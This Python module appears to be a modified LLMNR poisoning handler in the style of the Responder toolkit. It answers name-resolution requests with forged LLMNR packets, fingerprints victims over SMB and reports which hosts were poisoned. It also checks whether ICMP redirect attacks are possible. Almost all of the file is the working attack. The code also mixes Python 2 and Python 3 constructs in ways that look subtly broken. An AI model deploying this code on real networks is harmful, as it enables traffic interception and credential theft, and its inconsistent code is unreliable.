import struct  								
import fingerprint  							
from packets import LLMNR_Ans  					
from SocketServer import BaseRequestHandler  	
from utils import *  							


# Function to parse the LLMNR name from the request
def Parse_LLMNR_Name(data):
    NameLen = struct.unpack('>B', data[12])[0]
    return data[13:13+NameLen]

# Function to analyze if an ICMP redirect is plausible based on the IP address
def IsICMPRedirectPlausible(IP):
    dnsip = []  		# List to store DNS IPs from /etc/resolv.conf
    icmp_analysis = []  # New list to store analysis results
    # Opening and reading the DNS configuration file line by line
    for line in open('/etc/resolv.conf', 'r'):
        ip = line.split()  
        if len(ip) < 2:  	# Skip lines that don't contain IP addresses
            continue
        elif ip[0] == 'nameserver':  	# If it's a nameserver, extract the IP
            dnsip.extend(ip[1:])  		# Add the IP to the dnsip list
    # Analyzing if the DNS server is not on the same subnet as the target IP
    for x in dnsip:
        if x != "127.0.0.1" and not IsOnTheSameSubnet(x, IP):
            # Append ICMP analysis results to the list
            icmp_analysis.append(f"[Analyze mode: ICMP] You can ICMP Redirect on this network.")
            icmp_analysis.append(f"[Analyze mode: ICMP] This workstation ({IP}) is not on the same subnet as the DNS server ({x}).")
            icmp_analysis.append("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.")
    return icmp_analysis  # Return analysis results




if settings.Config.AnalyzeMode:
	IsICMPRedirectPlausible(settings.Config.Bind_To)

    
# The main class for handling LLMNR requests
class LLMNR(BaseRequestHandler):  # LLMNR Server class
    # Handle method is invoked whenever a new LLMNR request is received
    def handle(self):
        data, soc = self.request  		# Get the incoming data and the socket
        Name = Parse_LLMNR_Name(data)  	# Parse the LLMNR name from the request

        # List to store the poisoning results for sending to the HTML template
        poisoning_results = []

        # Check if the server should respond to the host (based on settings or rules)
        if not RespondToThisHost(self.client_address[0], Name):
            return None  # Exit if not responding to this host

        # If the request type matches LLMNR and it's an IPv6 request, continue
        if data[2:4] == "\x00\x00" and Parse_IPV6_Addr(data):
            Finger = None  # Initialize fingerprint result to None
            # If fingerprinting is enabled in the settings, run SMB fingerprinting
            if settings.Config.Finger_On_Off:
                Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))

            # If in analysis mode, log analysis data instead of poisoning
            if settings.Config.AnalyzeMode:
                LineHeader = "[Analyze mode: LLMNR]"
                poisoning_results.append(f"{LineHeader} Request by {self.client_address[0]} for {Name}, ignoring")
            else:  # Poisoning mode (sending spoofed responses)
                # Create a forged LLMNR answer packet
                Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
                Buffer.calculate()  # Calculate the final packet size and structure
                # Send the poisoned LLMNR answer back to the requesting client
                soc.sendto(str(Buffer), self.client_address)
                LineHeader = "[*] [LLMNR]"
                # Add the poisoning result to the results list
                poisoning_results.append(f"{LineHeader} Poisoned answer sent to {self.client_address[0]} for name {Name}")

            # If fingerprint data is available, log the OS and client versions
            if Finger is not None:
                poisoning_results.append(f"[FINGER] OS Version     : {Finger[0]}")
                poisoning_results.append(f"[FINGER] Client Version : {Finger[1]}")

        # Return the poisoning results to the views.py to display them on the web page
        return poisoning_results